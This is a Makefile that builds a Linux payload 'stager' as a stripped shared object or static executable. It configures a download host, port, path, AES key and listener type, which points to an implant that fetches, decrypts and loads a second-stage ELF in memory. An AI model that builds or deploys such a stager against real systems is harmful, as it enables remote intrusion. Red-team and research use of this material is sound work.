# Add tinf source files
TINF_SRC = adler32.c crc32.c tinfgzip.c tinflate.c tinfzlib.c tinf.h

# Update the list of source files
SRC = stager.c aes.c elf_loader.c $(TINF_SRC)

# Listener type: HTTP, TCP, or UDP (default: HTTP)
LISTENER_TYPE ?= HTTP

# Configure the download server via environment variables
CFLAGS += -DGOARCH_$(ARCH) -DDOWNLOAD_HOST=\"$(DOWNLOAD_HOST)\" -DDOWNLOAD_PORT=\"$(DOWNLOAD_PORT)\" -DDOWNLOAD_PATH=\"$(DOWNLOAD_PATH)\" -DDOWNLOAD_KEY=\"$(DOWNLOAD_KEY)\" -DLISTENER_$(LISTENER_TYPE)

stager_so:
	${CC} ${CFLAGS} -DOS_LINUX -DLINUX_SO $(SRC) -o stager.so -fPIC -shared -ldl -nostdlib -nodefaultlibs -s
	@echo "Stager shared object compiled successfully at ${PWD}/stager.so"

stager_so_debug:
	${CC} ${CFLAGS} -DDEBUG -DOS_LINUX -DLINUX_SO $(SRC) -o stager.so -pie -fPIC -shared -ldl -nostdlib -nodefaultlibs -g
	@echo "Stager shared object (with debug) compiled successfully at ${PWD}/stager.so"

stager_exe:
	musl-gcc ${CFLAGS} -DOS_LINUX -DLINUX_EXE $(SRC) -o stager -static -s
	@echo "Stager executable compiled successfully at ${PWD}/stager"

stager_exe_debug:
	musl-gcc ${CFLAGS} -DDEBUG -DOS_LINUX -DLINUX_EXE $(SRC) -o stager -static -g
	@echo "Stager executable (with debug) compiled successfully at ${PWD}/stager"
